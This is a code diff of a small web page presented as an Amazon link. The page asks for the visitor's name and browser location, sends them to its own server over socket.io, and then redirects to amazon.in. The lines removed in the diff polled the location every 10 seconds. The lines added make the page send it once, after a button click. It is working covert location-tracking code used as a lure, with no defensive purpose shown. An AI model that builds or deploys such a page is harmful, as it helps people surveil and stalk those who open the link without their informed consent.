@@ -4,38 +4,35 @@
     <title>Amazon + Live Location</title>
 </head>
 <body>
-    <h2>Loading Amazon & Sending Location...</h2>
+    <h2>Click the button to load Amazon & send location</h2>
+    <button id="startBtn">Start</button>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io(); // connect to server
         const name = prompt("Enter your name");
 
-        function sendLocation(position) {
-            const data = {
-                name: name,
-                lat: position.coords.latitude,
-                lon: position.coords.longitude
-            };
-            socket.emit("location", data); // send to server
-
-            // Permission granted → ab Amazon open karo
-            window.location.href = "https://www.amazon.in";
-        }
-
-        function requestLocation() {
-            if(navigator.geolocation) {
+        document.getElementById("startBtn").addEventListener("click", function() {
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    sendLocation,                  // Success → send location + open Amazon
-                    () => console.log("Location permission denied") // Denied
+                    (position) => {
+                        // Send location to server
+                        const data = {
+                            name: name,
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        };
+                        socket.emit("location", data);
+
+                        // Open Amazon after permission
+                        window.location.href = "https://www.amazon.in";
+                    },
+                    () => alert("Location permission denied")
                 );
             } else {
-                console.log("Geolocation not supported");
+                alert("Geolocation not supported");
             }
-        }
-
-        requestLocation();                     // Pehli location request
-        setInterval(requestLocation, 10000);   // Har 10 sec update
+        });
     </script>
 </body>
 </html>
